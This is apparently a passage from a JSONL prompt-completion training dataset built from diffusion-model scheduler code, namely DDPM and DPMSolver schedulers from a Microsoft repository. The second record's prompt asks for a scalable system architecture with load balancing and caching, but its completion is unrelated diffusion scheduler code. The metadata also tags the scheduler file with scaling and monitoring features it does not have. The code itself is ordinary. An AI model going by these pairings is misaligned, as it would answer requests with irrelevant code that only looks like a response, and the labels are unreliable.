being initialized with.\r\n\r\n    Returns:\r\n        `torch.Tensor`: rescaled betas with zero terminal SNR\r\n    \"\"\"\r\n    # Convert betas to alphas_bar_sqrt\r\n    alphas = 1.0 - betas\r\n    alphas_cumprod = torch.cumprod(alphas, dim=0)\r\n    alphas_bar_sqrt = alphas_cumprod.sqrt()\r\n\r\n    # Store old values.\r\n    alphas_bar_sqrt_0 = alphas_bar_sqrt[0].clone()\r\n    alphas_bar_sqrt_T = alphas_bar_sqrt[-1].clone()\r\n\r\n    # Shift so the last timestep is zero.\r\n    alphas_bar_sqrt -= alphas_bar_sqrt_T\r\n\r\n    # Scale so the first timestep is back to the old value.\r\n    alphas_bar_sqrt *= alphas_bar_sqrt_0 / (alphas_bar_sqrt_0 - alphas_bar_sqrt_T)\r\n\r\n    # Convert alphas_bar_sqrt to betas\r\n    alphas_bar = alphas_bar_sqrt**2  # Revert sqrt\r\n    alphas = alphas_bar[1:] / alphas_bar[:-1]  # Revert cumprod\r\n    alphas = torch.cat([alphas_bar[0:1], alphas])\r\n    betas = 1 - alphas\r\n\r\n    return betas\r\n\r\n\r\nclass DDPMScheduler(SchedulerMixin, ConfigMixin):\r\n    \"\"\"\r\n    `DDPMScheduler` explores the connections between denoising score matching and Langevin dynamics sampling.\r\n\r\n    This model inherits from [`SchedulerMixin`] and [`ConfigMixin`]. Check the superclass documentation for the generic\r\n    methods the library implements for all schedulers such as loading and saving.\r\n\r\n    Args:\r\n        num_train_timesteps (`int`, defaults to 1000):\r\n            The number of diffusion steps to train the model.\r\n        beta_start (`float`, defaults to 0.0001):\r\n            The starting `beta` value of inference.\r\n        beta_end (`float`, defaults to 0.02):\r\n            The final `beta` value.\r\n        beta_schedule (`str`, defaults to `\"linear\"`):\r\n            The beta schedule, a mapping from a beta range to a sequence of betas for stepping the model. Choose from\r\n            `linear`, `scaled_linear`, or `squaredcos_cap_v2`.\r\n        trained_betas (`np.ndarray`, *optional*):\r\n            An array of betas to pass directly to the constructor without using `beta_start` and `beta_end`.\r\n        variance_type (`str`, defaults to `\"fixed_small\"`):\r\n            Clip the variance when adding noise to the denoised sample. Choose from `fixed_small`, `fixed_small_log`,\r\n            `fixed_large`, `fixed_large_log`, `learned` or `learned_range`.\r\n        clip_sample (`bool`, defaults to `True`):\r\n            Clip the predicted sample for numerical stability.\r\n        clip_sample_range (`float`, defaults to 1.0):\r\n            The maximum magnitude for sample clipping. Valid only when `clip_sample=True`.\r\n        prediction_type (`str`, defaults to `epsilon`, *optional*):\r\n            Prediction type of the scheduler function; can be `epsilon` (predicts the noise of the diffusion process),\r\n            `sample` (directly predicts the noisy sample`) or `v_prediction` (see section 2.4 of [Imagen\r\n            Video](https://imagen.research.google/video/paper.pdf) paper).\r\n        thresholding (`bool`, defaults to `False`):\r\n            Whether to use the \"dynamic thresholding\" method. This is unsuitable for latent-space diffusion models such\r\n            as Stable Diffusion.\r\n        dynamic_thresholding_ratio (`float`, defaults to 0.995):\r\n            The ratio for the dynamic thresholding method. Valid only when `thresholding=True`.\r\n        sample_max_value (`float`, defaults to 1.0):\r\n            The threshold value for dynamic thresholding. Valid only when `thresholding=True`.\r\n        timestep_spacing (`str`, defaults to `\"leading\"`):\r\n            The way the timesteps should be scaled. Refer to Table 2 of the [Common Diffusion Noise Schedules and\r\n            Sample Steps are Flawed](https://huggingface.co/papers/2305.08891) for more information.\r\n        steps_offset (`int`, defaults to 0):\r\n            An offset added to the inference steps, as required by some model families.\r\n        rescale_betas_zero_snr (`bool`, defaults to `False`):\r\n            Whether to rescale the betas to have zero terminal SNR. This enables the model to generate very bright and\r\n            dark samples instead of limiting it to samples with medium brightness. Loosely related to\r\n            [`--offset_noise`](https://github.com/huggingface/diffusers/blob/74fd735eb073eb1d774b1ab4154a0876eb82f055/examples/dreambooth/train_dreambooth.py#L506).\r\n    \"\"\"\r\n\r\n    _compatibles = [e.name for e in KarrasDiffusionSchedulers]\r\n    order = 1\r\n\r\n    @register_to_config\r\n    def __init__(\r\n        self,\r\n        num_train_timesteps: int = 1000,\r\n        beta_start: float = 0.0001,\r\n        beta_end: float = 0.02,\r\n        beta_schedule: str = \"linear\",\r\n        trained_betas: Optional[Union[np.ndarray, List[float]]] = None,\r\n        variance_type: str = \"fixed_large\",\r\n        clip_sample: bool = False,\r\n        prediction_type: str = \"epsilon\",\r\n        thresholding: bool = False,\r\n        dynamic_thresholding_ratio: float = 0.995,\r\n        clip_sample_range: float = 1.0,\r\n        sample_max_value: float = 1.0,\r\n        timestep_spacing: str = \"leading\",\r\n        steps_offset: int = 0,\r\n        rescale_betas_zero_snr: int = False,\r\n    ):\r\n        if trained_betas is not None:\r\n            self.betas = torch.tensor(trained_betas, dtype=torch.float32)\r\n        elif beta_schedule == \"linear\":\r\n            self.betas = torch.linspace(beta_start, beta_end, num_train_timesteps, dtype=torch.float32)\r\n        elif beta_schedule == \"scaled_linear\":\r\n            # this schedule is very specific to the latent diffusion model.\r\n            self.betas = torch.linspace(beta_start**0.5, beta_end**0.5, num_train_timesteps, dtype=torch.float32) ** 2\r\n        elif beta_schedule == \"squaredcos_cap_v2\" or beta_schedule == \"cosine\":\r\n            # Glide cosine schedule\r\n            self.betas = betas_for_alpha_bar(num_train_timesteps, alpha_transform_type=\"cosine\")\r\n        elif beta_schedule == \"cauchy\":\r\n            self.betas = betas_for_alpha_bar(num_train_timesteps, alpha_transform_type=\"cauchy\")\r\n        elif beta_schedule == \"laplace\":\r\n            self.betas = betas_for_alpha_bar(num_train_timesteps, alpha_transform_type=\"laplace\")\r\n        elif beta_schedule == \"sigmoid\":\r\n            # GeoDiff sigmoid schedule\r\n            betas = torch.linspace(-6, 6, num_train_timesteps)\r\n            self.betas = torch.sigmoid(betas) * (beta_end - beta_start) + beta_start\r\n        else:\r\n            raise NotImplementedError(f\"{beta_schedule} is not implemented for {self.__class__}\")\r\n\r\n        # Rescale for zero SNR\r\n        if rescale_betas_zero_snr:\r\n            self.betas = rescale_zero_terminal_snr(self.betas)\r\n\r\n        self.alphas = 1.0 - self.betas\r\n        self.alphas_cumprod = torch.cumprod(self.alphas, dim=0)\r\n        self.one = torch.tensor(1.0)\r\n\r\n        # standard deviation of the initial noise distribution\r\n        self.init_noise_sigma = 1.0\r\n\r\n        # setable values\r\n        self.custom_timesteps = False\r\n        self.num_inference_steps = None\r\n        self.timesteps = torch.from_numpy(np.arange(0, num_train_timesteps)[::-1].copy())\r\n\r\n        self.variance_type = variance_type\r\n\r\n    def scale_model_input(self, sample: torch.Tensor, timestep: Optional[int] = None) -> torch.Tensor:\r\n        \"\"\"\r\n        Ensures interchangeability with schedulers that need to scale the denoising model input depending on the\r\n        current timestep.\r\n\r\n        Args:\r\n            sample (`torch.Tensor`):\r\n                The input sample.\r\n            timestep (`int`, *optional*):\r\n                The current timestep in the diffusion chain.\r\n\r\n        Returns:\r\n            `torch.Tensor`:\r\n                A scaled input sample.\r\n        \"\"\"\r\n        return sample\r\n\r\n    def set_timesteps(\r\n        self,\r\n        num_inference_steps: Optional[int] = None,\r\n        device: Union[str, torch.device] = None,\r\n        timesteps: Optional[List[int]] = None,\r\n    ):\r\n        \"\"\"\r\n        Sets the discrete timesteps used for the diffusion chain (to be run before inference).\r\n\r\n        Args:\r\n            num_inference_steps (`int`):\r\n                The number of diffusion steps used when generating samples with a pre-trained model. If used,\r\n                `timesteps` must be `None`.\r\n            device (`str` or `torch.device`, *optional*):\r\n                The device to which the timesteps should be moved to. If `None`, the timesteps are not moved.\r\n            timesteps (`List[int]`, *optional*):\r\n                Custom timesteps used to support arbitrary spacing between timesteps. If `None`, then the default\r\n                timestep spacing strategy of equal spacing between timesteps is used. If `timesteps` is passed,\r\n                `num_inference_steps` must be `None`.\r\n\r\n        \"\"\"\r\n        if num_inference_steps is not None and timesteps is not None:\r\n            raise ValueError(\"Can only pass one of `num_inference_steps` or `custom_timesteps`.\")\r\n\r\n        if timesteps is not None:\r\n            for i in range(1, len(timesteps)):\r\n                if timesteps[i] >= timesteps[i - 1]:\r\n                    raise ValueError(\"`custom_timesteps` must be in descending order.\")\r\n\r\n            if timesteps[0] >= self.config.num_train_timesteps:\r\n                raise ValueError(\r\n                    f\"`timesteps` must start before `self.config.train_timesteps`:\"\r\n                    f\" {self.config.num_train_timesteps}.\"\r\n                )\r\n\r\n            timesteps = np.array(timesteps, dtype=np.int64)\r\n            self.custom_timesteps = True\r\n        else:\r\n            if num_inference_steps > self.config.num_train_timesteps:\r\n                raise ValueError(\r\n                    f\"`num_inference_steps`: {num_inference_steps} cannot be larger than `self.config.train_timesteps`:\"\r\n                    f\" {self.config.num_train_timesteps} as the unet model trained with this scheduler can only handle\"\r\n                    f\" maximal {self.config.num_train_timesteps} timesteps.\"\r\n                )\r\n\r\n            self.num_inference_steps = num_inference_steps\r\n            self.custom_timesteps = False\r\n\r\n            # \"linspace\", \"leading\", \"trailing\" corresponds to annotation of Table 2. of https://arxiv.org/abs/2305.08891\r\n            if self.config.timestep_spacing == \"linspace\":\r\n                timesteps = (\r\n                    np.linspace(0, self.config.num_train_timesteps - 1, num_inference_steps)\r\n                    .round()[::-1]\r\n                    .copy()\r\n                    .astype(np.int64)\r\n                )\r\n            elif self.config.timestep_spacing == \"leading\":\r\n                step_ratio = self.config.num_train_timesteps // self.num_inference_steps\r\n                # creates integer timesteps by multiplying by ratio\r\n                # casting to int to avoid issues when num_inference_step is power of 3\r\n                timesteps = (np.arange(0, num_inference_steps) * step_ratio).round()[::-1].copy().astype(np.int64)\r\n                timesteps += self.config.steps_offset\r\n            elif self.config.timestep_spacing == \"trailing\":\r\n                step_ratio = self.config.num_train_timesteps / self.num_inference_steps\r\n                # creates integer timesteps by multiplying by ratio\r\n                # casting to int to avoid issues when num_inference_step is power of 3\r\n                timesteps = np.round(np.arange(self.config.num_train_timesteps, 0, -step_ratio)).astype(np.int64)\r\n                timesteps -= 1\r\n            else:\r\n                raise ValueError(\r\n                    f\"{self.config.timestep_spacing} is not supported. Please make sure to choose one of 'linspace', 'leading' or 'trailing'.\"\r\n                )\r\n\r\n        self.timesteps = torch.from_numpy(timesteps).to(device)\r\n\r\n    def _get_variance(self, t, predicted_variance=None, variance_type=None):\r\n        prev_t = self.previous_timestep(t)\r\n\r\n        alpha_prod_t = self.alphas_cumprod[t]\r\n        alpha_prod_t_prev = self.alphas_cumprod[prev_t] if prev_t >= 0 else self.one\r\n        current_beta_t = 1 - alpha_prod_t / alpha_prod_t_prev\r\n\r\n        # For t > 0, compute predicted variance βt (see formula (6) and (7) from https://arxiv.org/pdf/2006.11239.pdf)\r\n        # and sample from it to get previous sample\r\n        # x_{t-1} ~ N(pred_prev_sample, variance) == add variance to pred_sample\r\n        variance = (1 - alpha_prod_t_prev) / (1 - alpha_prod_t) * current_beta_t\r\n\r\n        # we always take the log of variance, so clamp it to ensure it's not 0\r\n        variance = torch.clamp(variance, min=1e-20)\r\n\r\n        if variance_type is None:\r\n            variance_type = self.config.variance_type\r\n\r\n        # hacks - were probably added for training stability\r\n        if variance_type == \"fixed_small\":\r\n            variance = variance\r\n        # for rl-diffuser https://arxiv.org/abs/2205.09991\r\n        elif variance_type == \"fixed_small_log\":\r\n            variance = torch.log(variance)\r\n            variance = torch.exp(0.5 * variance)\r\n        elif variance_type == \"fixed_large\":\r\n            variance = current_beta_t\r\n        elif variance_type == \"fixed_large_log\":\r\n            # Glide max_log\r\n            variance = torch.log(current_beta_t)\r\n        elif variance_type == \"learned\":\r\n            return predicted_variance\r\n        elif variance_type == \"learned_range\":\r\n            min_log = torch.log(variance)\r\n            max_log = torch.log(current_beta_t)\r\n            frac = (predicted_variance + 1) / 2\r\n            variance = frac * max_log + (1 - frac) * min_log\r\n\r\n        return variance\r\n\r\n    def _threshold_sample(self, sample: torch.Tensor) -> torch.Tensor:\r\n        \"\"\"\r\n        \"Dynamic thresholding: At each sampling step we set s to a certain percentile absolute pixel value in xt0 (the\r\n        prediction of x_0 at timestep t), and if s > 1, then we threshold xt0 to the range [-s, s] and then divide by\r\n        s. Dynamic thresholding pushes saturated pixels (those near -1 and 1) inwards, thereby actively preventing\r\n        pixels from saturation at each step. We find that dynamic thresholding results in significantly better\r\n        photorealism as well as better image-text alignment, especially when using very large guidance weights.\"\r\n\r\n        https://arxiv.org/abs/2205.11487\r\n        \"\"\"\r\n        dtype = sample.dtype\r\n        batch_size, channels, *remaining_dims = sample.shape\r\n\r\n        if dtype not in (torch.float32, torch.float64):\r\n            sample = sample.float()  # upcast for quantile calculation, and clamp not implemented for cpu half\r\n\r\n        # Flatten sample for doing quantile calculation along each image\r\n        sample = sample.reshape(batch_size, channels * np.prod(remaining_dims))\r\n\r\n        abs_sample = sample.abs()  # \"a certain percentile absolute pixel value\"\r\n\r\n        s = torch.quantile(abs_sample, self.config.dynamic_thresholding_ratio, dim=1)\r\n        s = torch.clamp(\r\n            s, min=1, max=self.config.sample_max_value\r\n        )  # When clamped to min=1, equivalent to standard clipping to [-1, 1]\r\n        s = s.unsqueeze(1)  # (batch_size, 1) because clamp will broadcast along dim=0\r\n        sample = torch.clamp(sample, -s, s) / s  # \"we threshold xt0 to the range [-s, s] and then divide by s\"\r\n\r\n        sample = sample.reshape(batch_size, channels, *remaining_dims)\r\n        sample = sample.to(dtype)\r\n\r\n        return sample\r\n\r\n    def step(\r\n        self,\r\n        model_output: torch.Tensor,\r\n        timestep: int,\r\n        sample: torch.Tensor,\r\n        generator=None,\r\n        return_dict: bool = True,\r\n    ) -> Union[DDPMSchedulerOutput, Tuple]:\r\n        \"\"\"\r\n        Predict the sample from the previous timestep by reversing the SDE. This function propagates the diffusion\r\n        process from the learned model outputs (most often the predicted noise).\r\n\r\n        Args:\r\n            model_output (`torch.Tensor`):\r\n                The direct output from learned diffusion model.\r\n            timestep (`float`):\r\n                The current discrete timestep in the diffusion chain.\r\n            sample (`torch.Tensor`):\r\n                A current instance of a sample created by the diffusion process.\r\n            generator (`torch.Generator`, *optional*):\r\n                A random number generator.\r\n            return_dict (`bool`, *optional*, defaults to `True`):\r\n                Whether or not to return a [`~schedulers.scheduling_ddpm.DDPMSchedulerOutput`] or `tuple`.\r\n\r\n        Returns:\r\n            [`~schedulers.scheduling_ddpm.DDPMSchedulerOutput`] or `tuple`:\r\n                If return_dict is `True`, [`~schedulers.scheduling_ddpm.DDPMSchedulerOutput`] is returned, otherwise a\r\n                tuple is returned where the first element is the sample tensor.\r\n\r\n        \"\"\"\r\n        t = timestep\r\n\r\n        prev_t = self.previous_timestep(t)\r\n\r\n        if model_output.shape[1] == sample.shape[1] * 2 and self.variance_type in [\"learned\", \"learned_range\"]:\r\n            model_output, predicted_variance = torch.split(model_output, sample.shape[1], dim=1)\r\n        else:\r\n            predicted_variance = None\r\n\r\n        # 1. compute alphas, betas\r\n        alpha_prod_t = self.alphas_cumprod[t]\r\n        alpha_prod_t_prev = self.alphas_cumprod[prev_t] if prev_t >= 0 else self.one\r\n        beta_prod_t = 1 - alpha_prod_t\r\n        beta_prod_t_prev = 1 - alpha_prod_t_prev\r\n        current_alpha_t = alpha_prod_t / alpha_prod_t_prev\r\n        current_beta_t = 1 - current_alpha_t\r\n\r\n        # 2. compute predicted original sample from predicted noise also called\r\n        # \"predicted x_0\" of formula (15) from https://arxiv.org/pdf/2006.11239.pdf\r\n        if self.config.prediction_type == \"epsilon\":\r\n            pred_original_sample = (sample - beta_prod_t ** (0.5) * model_output) / alpha_prod_t ** (0.5)\r\n        elif self.config.prediction_type == \"sample\":\r\n            pred_original_sample = model_output\r\n        elif self.config.prediction_type == \"v_prediction\":\r\n            pred_original_sample = (alpha_prod_t**0.5) * sample - (beta_prod_t**0.5) * model_output\r\n        else:\r\n            raise ValueError(\r\n                f\"prediction_type given as {self.config.prediction_type} must be one of `epsilon`, `sample` or\"\r\n                \" `v_prediction`  for the DDPMScheduler.\"\r\n            )\r\n\r\n        # 3. Clip or threshold \"predicted x_0\"\r\n        if self.config.thresholding:\r\n            pred_original_sample = self._threshold_sample(pred_original_sample)\r\n        elif self.config.clip_sample:\r\n            pred_original_sample = pred_original_sample.clamp(\r\n                -self.config.clip_sample_range, self.config.clip_sample_range\r\n            )\r\n\r\n        # 4. Compute coefficients for pred_original_sample x_0 and current sample x_t\r\n        # See formula (7) from https://arxiv.org/pdf/2006.11239.pdf\r\n        pred_original_sample_coeff = (alpha_prod_t_prev ** (0.5) * current_beta_t) / beta_prod_t\r\n        current_sample_coeff = current_alpha_t ** (0.5) * beta_prod_t_prev / beta_prod_t\r\n\r\n        # 5. Compute predicted previous sample µ_t\r\n        # See formula (7) from https://arxiv.org/pdf/2006.11239.pdf\r\n        pred_prev_sample = pred_original_sample_coeff * pred_original_sample + current_sample_coeff * sample\r\n\r\n        # 6. Add noise\r\n        variance = 0\r\n        if t > 0:\r\n            device = model_output.device\r\n            variance_noise = randn_tensor(\r\n                model_output.shape, generator=generator, device=device, dtype=model_output.dtype\r\n            )\r\n            if self.variance_type == \"fixed_small_log\":\r\n                variance = self._get_variance(t, predicted_variance=predicted_variance) * variance_noise\r\n            elif self.variance_type == \"learned_range\":\r\n                variance = self._get_variance(t, predicted_variance=predicted_variance)\r\n                variance = torch.exp(0.5 * variance) * variance_noise\r\n            else:\r\n                variance = (self._get_variance(t, predicted_variance=predicted_variance) ** 0.5) * variance_noise\r\n\r\n        pred_prev_sample = pred_prev_sample + variance\r\n\r\n        if not return_dict:\r\n            return (pred_prev_sample,)\r\n\r\n        return DDPMSchedulerOutput(prev_sample=pred_prev_sample, pred_original_sample=pred_original_sample)\r\n\r\n    def add_noise(\r\n        self,\r\n        original_samples: torch.Tensor,\r\n        noise: torch.Tensor,\r\n        timesteps: torch.IntTensor,\r\n    ) -> torch.Tensor:\r\n        # Make sure alphas_cumprod and timestep have same device and dtype as original_samples\r\n        # Move the self.alphas_cumprod to device to avoid redundant CPU to GPU data movement\r\n        # for the subsequent add_noise calls\r\n        self.alphas_cumprod = self.alphas_cumprod.to(device=original_samples.device)\r\n        alphas_cumprod = self.alphas_cumprod.to(dtype=original_samples.dtype)\r\n        timesteps = timesteps.to(original_samples.device)\r\n\r\n        sqrt_alpha_prod = alphas_cumprod[timesteps] ** 0.5\r\n        sqrt_alpha_prod = sqrt_alpha_prod.flatten()\r\n        while len(sqrt_alpha_prod.shape) < len(original_samples.shape):\r\n            sqrt_alpha_prod = sqrt_alpha_prod.unsqueeze(-1)\r\n\r\n        sqrt_one_minus_alpha_prod = (1 - alphas_cumprod[timesteps]) ** 0.5\r\n        sqrt_one_minus_alpha_prod = sqrt_one_minus_alpha_prod.flatten()\r\n        while len(sqrt_one_minus_alpha_prod.shape) < len(original_samples.shape):\r\n            sqrt_one_minus_alpha_prod = sqrt_one_minus_alpha_prod.unsqueeze(-1)\r\n\r\n        noisy_samples = sqrt_alpha_prod * original_samples + sqrt_one_minus_alpha_prod * noise\r\n        return noisy_samples\r\n\r\n    def get_velocity(self, sample: torch.Tensor, noise: torch.Tensor, timesteps: torch.IntTensor) -> torch.Tensor:\r\n        # Make sure alphas_cumprod and timestep have same device and dtype as sample\r\n        self.alphas_cumprod = self.alphas_cumprod.to(device=sample.device)\r\n        alphas_cumprod = self.alphas_cumprod.to(dtype=sample.dtype)\r\n        timesteps = timesteps.to(sample.device)\r\n\r\n        sqrt_alpha_prod = alphas_cumprod[timesteps] ** 0.5\r\n        sqrt_alpha_prod = sqrt_alpha_prod.flatten()\r\n        while len(sqrt_alpha_prod.shape) < len(sample.shape):\r\n            sqrt_alpha_prod = sqrt_alpha_prod.unsqueeze(-1)\r\n\r\n        sqrt_one_minus_alpha_prod = (1 - alphas_cumprod[timesteps]) ** 0.5\r\n        sqrt_one_minus_alpha_prod = sqrt_one_minus_alpha_prod.flatten()\r\n        while len(sqrt_one_minus_alpha_prod.shape) < len(sample.shape):\r\n            sqrt_one_minus_alpha_prod = sqrt_one_minus_alpha_prod.unsqueeze(-1)\r\n\r\n        velocity = sqrt_alpha_prod * noise - sqrt_one_minus_alpha_prod * sample\r\n        return velocity\r\n\r\n    def __len__(self):\r\n        return self.config.num_train_timesteps\r\n\r\n    def previous_timestep(self, timestep):\r\n        if self.custom_timesteps:\r\n            index = (self.timesteps == timestep).nonzero(as_tuple=True)[0][0]\r\n            if index == self.timesteps.shape[0] - 1:\r\n                prev_t = torch.tensor(-1)\r\n            else:\r\n                prev_t = self.timesteps[index + 1]\r\n        else:\r\n            num_inference_steps = (\r\n                self.num_inference_steps if self.num_inference_steps else self.config.num_train_timesteps\r\n            )\r\n            prev_t = timestep - self.config.num_train_timesteps // num_inference_steps\r\n\r\n        return prev_t\r\n", "metadata": {"source": "github.com/microsoft/unilm", "file_path": "LatentLM/schedule/ddpm.py", "language": "python", "complexity": "complex", "star_count": 21572, "quality_score": 0.98, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": true, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 579}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design scalable system architecture with load balancing and caching for distributed system requirements\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Copyright 2024 TSAIL Team and The HuggingFace Team. All rights reserved.\r\n#\r\n# Licensed under the Apache License, Version 2.0 (the \"License\");\r\n# you may not use this file except in compliance with the License.\r\n# You may obtain a copy of the License at\r\n#\r\n#     http://www.apache.org/licenses/LICENSE-2.0\r\n#\r\n# Unless required by applicable law or agreed to in writing, software\r\n# distributed under the License is distributed on an \"AS IS\" BASIS,\r\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\r\n# See the License for the specific language governing permissions and\r\n# limitations under the License.\r\n\r\n# DISCLAIMER: This file is strongly influenced by https://github.com/LuChengTHU/dpm-solver\r\n\r\nimport math\r\nfrom typing import List, Optional, Tuple, Union\r\n\r\nimport numpy as np\r\nimport torch\r\n\r\nfrom diffusers.configuration_utils import ConfigMixin, register_to_config\r\nfrom diffusers.utils import deprecate\r\nfrom diffusers.utils.torch_utils import randn_tensor\r\nfrom diffusers.schedulers.scheduling_utils import KarrasDiffusionSchedulers, SchedulerMixin, SchedulerOutput\r\n\r\nfrom .ddpm import betas_for_alpha_bar, rescale_zero_terminal_snr\r\n\r\n\r\nclass DPMSolverMultistepScheduler(SchedulerMixin, ConfigMixin):\r\n    \"\"\"\r\n    `DPMSolverMultistepScheduler` is a fast dedicated high-order solver for diffusion ODEs.\r\n\r\n    This model inherits from [`SchedulerMixin`] and [`ConfigMixin`]. Check the superclass documentation for the generic\r\n    methods the library implements for all schedulers such as loading and saving.\r\n\r\n    Args:\r\n        num_train_timesteps (`int`, defaults to 1000):\r\n            The number of diffusion steps to train the model.\r\n        beta_start (`float`, defaults to 0.0001):\r\n            The starting `beta` value of inference.\r\n        beta_end (`float`, defaults to 0.02):\r\n            The final `beta` value.\r\n        beta_schedule (`str`, defaults to `\"linear\"`):\r\n            The beta schedule, a mapping from a beta range to a sequence of betas for stepping the model. Choose from\r\n            `linear`, `scaled_linear`, or `squaredcos_cap_v2`.\r\n        trained_betas (`np.ndarray`, *optional*):\r\n            Pass an array of betas directly to the constructor to bypass `beta_start` and `beta_end`.\r\n        solver_order (`int`, defaults to 2):\r\n            The DPMSolver order which can be `1` or `2` or `3`. It is recommended to use `solver_order=2` for guided\r\n            sampling, and `solver_order=3` for unconditional sampling.\r\n        prediction_type (`str`, defaults to `epsilon`, *optional*):\r\n            Prediction type of the scheduler function; can be `epsilon` (predicts the noise of the diffusion process),\r\n            `sample` (directly predicts the noisy sample`) or `v_prediction` (see section 2.4 of [Imagen\r\n            Video](https://imagen.research.google/video/paper.pdf) paper).\r\n        thresholding (`bool`, defaults to `False`):\r\n            Whether to use the \"dynamic thresholding\" method. This is unsuitable for latent-space diffusion models such\r\n            as Stable Diffusion.\r\n        dynamic_thresholding_ratio (`float`, defaults to 0.995):\r\n            The ratio for the dynamic thresholding method. Valid only when `thresholding=True`.\r\n        sample_max_value (`float`, defaults to 1.0):\r\n            The threshold value for dynamic thresholding. Valid only when `thresholding=True` and\r\n            `algorithm_type=\"dpmsolver++\"`.\r\n        algorithm_type (`str`, defaults to `dpmsolver++`):\r\n            Algorithm type for the solver; can be `dpmsolver`, `dpmsolver++`, `sde-dpmsolver` or `sde-dpmsolver++`. The\r\n            `dpmsolver` type implements the algorithms in the [DPMSolver](https://huggingface.co/papers/2206.00927)\r\n            paper, and the `dpmsolver++` type implements the algorithms in the\r\n            [DPMSolver++](https://huggingface.co/papers/2211.01095) paper. It is recommended to use `dpmsolver++` or\r\n            `sde-dpmsolver++` with `solver_order=2` for guided sampling like in Stable Diffusion.\r\n        solver_type (`str`, defaults to `midpoint`):\r\n            Solver type for the second-order solver; can be `midpoint` or `heun`. The solver type slightly affects the\r\n            sample quality, especially for a small number of steps. It is recommended to use `midpoint` solvers.\r\n        lower_order_final (`bool`, defaults to `True`):\r\n            Whether to use lower-order solvers in the final steps. Only valid for < 15 inference steps. This can\r\n            stabilize the sampling of DPMSolver for steps < 15, especially for steps <= 10.\r\n        euler_at_final (`bool`, defaults to `False`):\r\n            Whether to use Euler's method in the final step. It is a trade-off between numerical stability and detail\r\n            richness. This can stabilize the sampling of the SDE variant of DPMSolver for small number of inference\r\n            steps, but sometimes may result in blurring.\r\n        use_karras_sigmas (`bool`, *optional*, defaults to `False`):\r\n            Whether to use Karras sigmas for step sizes in the noise schedule during the sampling process. If `True`,\r\n            the sigmas are determined according to a sequence of noise levels {σi}.\r\n        use_lu_lambdas (`bool`, *optional*, defaults to `False`):\r\n            Whether to use the uniform-logSNR for step sizes proposed by Lu's DPM-Solver in the noise schedule during\r\n            the sampling process. If `True`, the sigmas and time steps are determined according to a sequence of\r\n            `lambda(t)`.\r\n        final_sigmas_type (`str`, defaults to `\"zero\"`):\r\n            The final `sigma` value for the noise schedule during the sampling process. If `\"sigma_min\"`, the final\r\n            sigma is the same as the last sigma in the training schedule. If `zero`, the final sigma is set to 0.\r\n        lambda_min_clipped (`float`, defaults to `-inf`):\r\n            Clipping threshold for the minimum value of `lambda(t)` for numerical stability. This is critical for the\r\n            cosine (`squaredcos_cap_v2`) noise schedule.\r\n        variance_type (`str`, *optional*):\r\n            Set to \"learned\" or \"learned_range\" for diffusion models that predict variance. If set, the model's output\r\n            contains the predicted Gaussian variance.\r\n        timestep_spacing (`str`, defaults to `\"linspace\"`):\r\n            The way the timesteps should be scaled. Refer to Table 2 of the [Common Diffusion Noise Schedules and\r\n            Sample Steps are Flawed](https://huggingface.co/papers/2305.08891) for more information.\r\n        steps_offset (`int`, defaults to 0):\r\n            An offset added to the inference steps, as required by some model families.\r\n        rescale_betas_zero_snr (`bool`, defaults to `False`):\r\n            Whether to rescale the betas to have zero terminal SNR. This enables the model to generate very bright and\r\n            dark samples instead of limiting it to samples with medium brightness. Loosely related to\r\n            [`--offset_noise`](https://github.com/huggingface/diffusers/blob/74fd735eb073eb1d774b1ab4154a0876eb82f055/examples/dreambooth/train_dreambooth.py#L506).\r\n    \"\"\"\r\n\r\n    _compatibles = [e.name for e in KarrasDiffusionSchedulers]\r\n    order = 1\r\n\r\n    @register_to_config\r\n    def __init__(\r\n        self,\r\n        num_train_timesteps: int = 1000,\r\n        beta_start: float = 0.0001,\r\n        beta_end: float = 0.02,\r\n        beta_schedule: str = \"linear\",\r\n        trained_betas: Optional[Union[np.ndarray, List[float]]] = None,\r\n        solver_order: int = 2,\r\n        prediction_type: str = \"epsilon\",\r\n        thresholding: bool = False,\r\n        dynamic_thresholding_ratio: float = 0.995,\r\n        sample_max_value: float = 1.0,\r\n        algorithm_type: str = \"dpmsolver++\",\r\n        solver_type: str = \"midpoint\",\r\n        lower_order_final: bool = True,\r\n        euler_at_final: bool = False,\r\n        use_karras_sigmas: Optional[bool] = False,\r\n        use_lu_lambdas: Optional[bool] = False,\r\n        final_sigmas_type: Optional[str] = \"zero\",  # \"zero\", \"sigma_min\"\r\n        lambda_min_clipped: float = -float(\"inf\"),\r\n        variance_type: Optional[str] = None,\r\n        timestep_spacing: str = \"linspace\",\r\n        steps_offset: int = 0,\r\n        rescale_betas_zero_snr: bool = False,\r\n    ):\r\n        if algorithm_type in [\"dpmsolver\", \"sde-dpmsolver\"]:\r\n            deprecation_message = f\"algorithm_type {algorithm_type} is deprecated and will be removed in a future version. Choose from `dpmsolver++` or `sde-dpmsolver++` instead\"\r\n            deprecate(\"algorithm_types dpmsolver and sde-dpmsolver\", \"1.0.0\", deprecation_message)\r\n\r\n        if trained_betas is not None:\r\n            self.betas = torch.tensor(trained_betas, dtype=torch.float32)\r\n        elif beta_schedule == \"linear\":\r\n            self.betas = torch.linspace(beta_start, beta_end, num_train_timesteps, dtype=torch.float32)\r\n        elif beta_schedule == \"scaled_linear\":\r\n            # this schedule is very specific to the latent diffusion model.\r\n            self.betas = torch.linspace(beta_start**0.5, beta_end**0.5, num_train_timesteps, dtype=torch.float32) ** 2\r\n        elif beta_schedule == \"squaredcos_cap_v2\" or beta_schedule == \"cosine\":\r\n            # Glide cosine schedule\r\n            self.betas = betas_for_alpha_bar(num_train_timesteps, alpha_transform_type=\"cosine\")\r\n        elif beta_schedule == \"cauchy\":\r\n            self.betas = betas_for_alpha_bar(num_train_timesteps, alpha_transform_type=\"cauchy\")\r\n        elif beta_schedule == \"laplace\":\r\n            self.betas = betas_for_alpha_bar(num_train_timesteps, alpha_transform_type=\"laplace\")\r\n        else:\r\n            raise NotImplementedError(f\"{beta_schedule} is not implemented for 